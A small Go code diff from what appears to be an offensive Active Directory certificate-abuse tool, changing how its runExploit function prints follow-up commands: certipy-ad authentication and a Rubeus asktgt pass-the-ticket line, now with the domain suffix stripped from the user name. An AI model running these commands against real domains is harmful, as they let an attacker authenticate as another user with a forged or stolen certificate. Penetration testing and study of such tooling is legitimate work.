@@ -801,7 +801,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	if !selfSigned {
 		fmt.Printf("\n[*] Authenticate with the certificate:\n")
 		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, cfg.Domain)
-		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", upn, pfxPath)
+		sam := upn
+		if idx := strings.Index(sam, "@"); idx > 0 {
+			sam = sam[:idx]
+		}
+		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", sam, pfxPath)
 	}
 	return nil
 }
